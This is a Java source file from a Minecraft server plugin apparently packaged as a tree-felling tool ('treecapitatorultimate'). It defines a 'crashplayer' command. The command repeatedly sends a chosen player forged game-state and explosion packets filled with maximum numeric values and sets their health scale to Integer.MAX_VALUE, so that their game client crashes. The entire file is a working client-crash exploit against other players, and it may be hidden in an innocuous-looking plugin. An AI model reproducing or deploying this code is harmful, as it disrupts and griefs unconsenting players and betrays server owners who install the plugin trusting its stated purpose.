package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.Collections;

@Command.Info(command = "crashplayer", description = "Crashes player's mc by sending magical shit.", category = CommandCategory.Player, requiredArgs = 1)
public class CrashPlayer extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        for (String arg : args) {
            try {
                Player anotherPlayer = Bukkit.getPlayer(arg);
                if (anotherPlayer == null) {
                    Start.ErrorString(p, "Player \"" + arg + "\" is not online!");
                    continue;
                }
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " is being crashed using combined method (packet, health and particles)!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is crashing " + anotherPlayer.getDisplayName() + "!");
                new BukkitRunnable() {
                    final Class<?> vec3D = ReflectionUtils.getClassCached("{nms}.Vec3D");
                    final Object packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange"), int.class, float.class).invoke(4, Float.MAX_VALUE);
                    final Object packetPlayOutExplosion = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutExplosion"), double.class, double.class, double.class, float.class, java.util.List.class, vec3D).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), ReflectionUtils.getConstructorCached(vec3D, double.class, double.class, double.class).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
                    int times = 0;

                    @Override
                    public void run() {
                        if (times++ >= 100) {
                            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (crashing happened 100 times)");
                            this.cancel();
                            return;
                        }
                        if (!anotherPlayer.isOnline()) {
                            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (player disconnected)");
                            this.cancel();
                            return;
                        }
                        crashPlayer(anotherPlayer, packetPlayOutGameStateChange, packetPlayOutExplosion);
                    }
                }.runTaskTimerAsynchronously(this.plugin, 0L, 5L);
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " should be gone after 30 seconds (time out limit) now!");
            } catch (Exception e) {
                Start.ErrorException(p, e);
            }
        }
    }

    private void crashPlayer(Player p, Object packetPlayOutGameStateChange, Object packetPlayOutExplosion) {
        try {
            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(packetPlayOutGameStateChange));
            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(packetPlayOutExplosion));
        } catch (Exception ignored) {
        }
        p.setHealthScale(Integer.MAX_VALUE);
    }
}